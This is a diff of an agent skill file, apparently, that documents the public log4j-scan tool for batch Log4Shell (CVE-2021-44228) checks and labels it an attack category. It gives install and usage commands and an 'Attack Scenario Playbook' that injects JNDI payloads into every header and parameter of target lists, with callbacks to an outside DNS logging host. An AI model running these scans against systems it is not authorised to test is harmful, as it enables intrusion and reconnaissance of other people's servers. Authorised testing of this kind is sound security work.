@@ -2,39 +2,42 @@
 name: log4j-scan-cve
 description: "log4j-scan: Batch validate Log4Shell. Signals: vulnerability intelligence, CVE, self-hosted DNS receiver, timeout."
 zh-signals: "log4j-scan: Log4Shell 批量验证。信号:漏洞情报,cve,自建 DNS 接收,超时。"
+when-to-use: >-
+  Use when validating Log4Shell (CVE-2021-44228) exposure across many web
+  targets and you can provide a DNS or out-of-band callback receiver.
 ---
 
 # log4j-scan
 
-- 攻击大类:C06 CVE专项利用
-- 上游仓库:https://github.com/fullhunt/log4j-scan
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C06 Targeted CVE Exploitation
+- Upstream Repository: https://github.com/fullhunt/log4j-scan
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python log4j-scan.py -u https://t.com` | Log4Shell CVE-2021-44228 扫描 |
-| `-l urls.txt` | 批量 |
-| `--run-all-tests` | 全 header/参数测试 |
-| `--custom-dns-callback vps.t.com` | 自建 DNS 接收 |
-| `-w 20` | 超时 |
+| `python log4j-scan.py -u https://t.com` | Log4Shell CVE-2021-44228 scan |
+| `-l urls.txt` | Batch |
+| `--run-all-tests` | Test all headers/parameters |
+| `--custom-dns-callback vps.t.com` | Self-hosted DNS receiver |
+| `-w 20` | Timeout |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Log4Shell 批量验证
+### Batch Log4Shell validation
 
 ```bash
 python log4j-scan.py -l targets.txt --custom-dns-callback x.dnslog.cn
-# 全部 HTTP 头+常见参数注入 JNDI payload
+# Inject the JNDI payload into every HTTP header and common parameter
 ```
 
-## 注意事项
+## Notes
 
-FullHunt 出品,Log4Shell 全量检测(全 header/全参数/多协议),支持自建 OOB。
+By FullHunt; exhaustive Log4Shell detection (all headers, all parameters, multiple protocols) with self-hosted OOB support.
